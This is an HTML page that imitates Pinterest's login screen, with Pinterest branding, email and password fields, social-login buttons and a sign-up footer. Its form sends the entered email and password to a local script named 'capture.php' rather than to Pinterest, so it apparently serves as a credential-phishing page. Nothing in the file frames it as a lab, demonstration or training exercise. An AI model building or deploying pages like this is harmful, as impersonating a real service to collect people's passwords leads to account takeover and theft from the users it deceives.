<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinterest Login UI</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h2>PINTEREST LOGIN </h2>
        <form action="./capture.php" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="divider">OR</div>
        <div class="social-login">
            <button class="facebook">Continue with Facebook</button>
            <button class="google">Continue with Google</button>
        </div>
        <div class="footer">
            <p>Not on Pinterest yet? <a href="#">Sign up</a></p>
            <p>Are you a business? <a href="#">Get started here!</a></p>
        </div>
    </div>
</body>
</html>
